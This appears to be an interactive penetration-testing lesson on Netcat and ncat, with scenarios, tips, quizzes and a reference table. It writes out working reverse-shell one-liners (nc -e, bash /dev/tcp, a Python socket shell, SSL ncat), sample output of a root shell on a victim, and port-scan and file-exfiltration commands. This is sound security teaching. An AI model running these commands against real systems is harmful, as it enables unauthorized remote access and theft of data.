# Netcat

Netcat (nc) is a lightweight network utility for reading and writing raw data over TCP or UDP connections. Often called the "Swiss Army knife" of networking, it is widely used in penetration testing for establishing reverse shells, transferring files, port scanning, and banner grabbing. On Kali Linux the Nmap project's version, **ncat**, is the standard.

## Overview

Netcat is essential for:
- **Reverse Shells**: Get a shell back from a compromised target through firewalls
- **Bind Shells**: Open a listening shell on the target that you connect to
- **File Transfer**: Move files between machines without SCP or FTP
- **Port Scanning**: Quick TCP connectivity checks across a range of ports
- **Banner Grabbing**: Identify services and versions on open ports

### Installation

Netcat is pre-installed on Kali Linux and most Linux distributions.

```bash
# Kali / Debian — install ncat (Nmap's version)
sudo apt install ncat

# macOS
brew install nmap   # includes ncat

# Check version
nc --version
ncat --version
```

:::command-builder{id="netcat-builder"}
tool_name: nc
target_placeholder: "192.168.1.100"
scan_types:
  - name: "Listen for Connection"
    flag: "-lvp 4444"
    desc: "Open a listener on port 4444 waiting for incoming connection"
  - name: "Connect to Target"
    flag: "192.168.1.100 4444"
    desc: "Connect outbound to a listener"
  - name: "Port Scan"
    flag: "-zv 192.168.1.100 1-1000"
    desc: "Scan a range of ports for open TCP services"
  - name: "Banner Grab"
    flag: "192.168.1.100 80"
    desc: "Connect to a port and read the service banner"
options:
  - name: "UDP Mode"
    flag: "-u"
    desc: "Use UDP instead of TCP"
  - name: "Execute Shell"
    flag: "-e /bin/bash"
    desc: "Execute a program after connecting (bind or reverse shell)"
  - name: "Keep Listening"
    flag: "-k"
    desc: "Keep the listener open after a client disconnects"
  - name: "Verbose"
    flag: "-v"
    desc: "Show connection details"
:::

## Core Concepts

### Reverse Shell vs Bind Shell

| Type | Who Listens | Who Connects | Firewall Bypass |
|------|-------------|--------------|-----------------|
| **Reverse Shell** | Attacker | Target calls back | Yes — outbound traffic usually allowed |
| **Bind Shell** | Target | Attacker connects in | No — requires inbound port open |

Reverse shells are preferred in real engagements because firewalls typically block inbound connections to targets but allow outbound.

### Basic Workflow — Reverse Shell

```
# On attacker machine (listen first)
nc -lvp 4444

# On target machine (trigger the callback)
nc <attacker-ip> 4444 -e /bin/bash
```

---

:::scenario{id="scenario-1" level="beginner"}
title: "Set Up a Reverse Shell Listener"
goal: "Open a Netcat listener on your attack machine and receive a shell from a compromised target."
hint: "Always start the listener before triggering the connection on the target. -l=listen, -v=verbose, -p=port. Port 4444 is common but any unused port works."
command: "nc -lvp 4444"
expected_output: |
  # On attacker machine (Kali):
  $ nc -lvp 4444
  Listening on 0.0.0.0 4444

  # After target connects:
  Connection received on 192.168.1.105 49231
  bash: no job control in this shell
  root@victim:~# id
  uid=0(root) gid=0(root) groups=0(root)
  root@victim:~# whoami
  root
:::

:::scenario{id="scenario-2" level="beginner"}
title: "Send a Reverse Shell from Target (Linux)"
goal: "Execute a reverse shell on a compromised Linux target that calls back to your listener."
hint: "If the target's nc doesn't support -e, use the bash /dev/tcp method instead. Many hardened systems ship with nc compiled without -e (the -e flag is 'traditional' netcat behavior)."
command: "nc <attacker-ip> 4444 -e /bin/bash"
expected_output: |
  # If nc supports -e flag:
  nc 192.168.1.10 4444 -e /bin/bash

  # Alternative — bash built-in TCP (no nc needed on target):
  bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

  # Python alternative:
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
:::

:::scenario{id="scenario-3" level="beginner"}
title: "Banner Grabbing – Identify a Service"
goal: "Connect to an open port and read the service banner to identify software and version."
hint: "Many services (SSH, FTP, SMTP, HTTP) announce themselves on connection. Type a blank HTTP request to get an HTTP banner. This is passive fingerprinting — the target logs your connection."
command: "nc -v 192.168.1.100 22"
expected_output: |
  $ nc -v 192.168.1.100 22
  Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
  SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6

  # HTTP banner grab:
  $ nc -v 192.168.1.100 80
  Connection to 192.168.1.100 80 port [tcp/http] succeeded!
  HEAD / HTTP/1.0

  HTTP/1.1 200 OK
  Server: Apache/2.4.52 (Ubuntu)
  X-Powered-By: PHP/8.1.2
:::

:::scenario{id="scenario-4" level="beginner"}
title: "File Transfer Between Machines"
goal: "Transfer a file from the attacker to the target (or vice versa) using Netcat."
hint: "Netcat can pipe data from stdin/stdout over a TCP connection — making it a quick file transfer tool when SCP or FTP are unavailable. Receiver listens first, sender connects and pipes the file."
command: "nc -lvp 5555 > received_file.txt"
expected_output: |
  # On RECEIVER (listens first):
  nc -lvp 5555 > received_file.txt

  # On SENDER (connects and pipes file):
  nc 192.168.1.10 5555 < secret_data.txt

  # Transfer completes when sender disconnects
  # Verify integrity:
  md5sum secret_data.txt      # on sender
  md5sum received_file.txt    # on receiver — should match
:::

:::scenario{id="scenario-5" level="intermediate"}
title: "Quick Port Scan with Netcat"
goal: "Scan a range of ports on a target to identify open services."
hint: "Use -z (zero I/O — just scan, don't send data) and -v for verbose output. Redirect stderr to see results. This is slow compared to Nmap but works when Nmap isn't available."
command: "nc -zv 192.168.1.100 1-1000 2>&1 | grep succeeded"
expected_output: |
  $ nc -zv 192.168.1.100 1-1000 2>&1 | grep succeeded
  Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
  Connection to 192.168.1.100 80 port [tcp/http] succeeded!
  Connection to 192.168.1.100 443 port [tcp/https] succeeded!
  Connection to 192.168.1.100 445 port [tcp/microsoft-ds] succeeded!
:::

## Tips & Tricks

```bash
# Upgrade a basic shell to a more interactive TTY
# After catching a reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Persistent listener (re-opens after each connection)
ncat -lvkp 4444

# Encrypted reverse shell with ncat (SSL)
# Attacker (listener):
ncat --ssl -lvp 4444
# Target:
ncat --ssl 192.168.1.10 4444 -e /bin/bash

# Chat between two machines (quick comms channel)
# Machine 1: nc -lvp 1234
# Machine 2: nc 192.168.1.10 1234

# Relay / port forward (pipe two nc instances)
nc -lvp 8080 | nc 10.0.0.5 80
```

---

:::quiz{id="quiz-1"}
Q: In a reverse shell, which machine opens the listener?
- [ ] The target machine
- [x] The attacker machine
- [ ] Both machines simultaneously
- [ ] A third relay machine
:::

:::quiz{id="quiz-2"}
Q: What Netcat flag is used to listen for incoming connections?
- [ ] -c
- [ ] -r
- [x] -l
- [ ] -s
:::

:::quiz{id="quiz-3"}
Q: Why are reverse shells preferred over bind shells in most penetration tests?
- [ ] Reverse shells are faster than bind shells
- [ ] Bind shells require root privileges
- [x] Outbound connections from the target usually bypass firewall rules that block inbound connections
- [ ] Reverse shells do not require Netcat to be installed on the target
:::

## Quick Reference

| Command | Purpose |
|---------|---------|
| `nc -lvp 4444` | Listen on port 4444 (attacker) |
| `nc <ip> 4444 -e /bin/bash` | Reverse shell (Linux, classic nc) |
| `bash -i >& /dev/tcp/<ip>/4444 0>&1` | Bash reverse shell (no nc needed) |
| `nc -lvp 5555 > file.txt` | Receive a file |
| `nc <ip> 5555 < file.txt` | Send a file |
| `nc -zv <ip> 1-1000` | Port scan range |
| `nc -v <ip> <port>` | Connect and grab banner |
| `ncat --ssl -lvp 4444` | Encrypted listener (ncat) |
| `nc -lvkp 4444` | Persistent listener (keep open) |
| `-u` | Use UDP instead of TCP |
| `-w 3` | Timeout after 3 seconds |
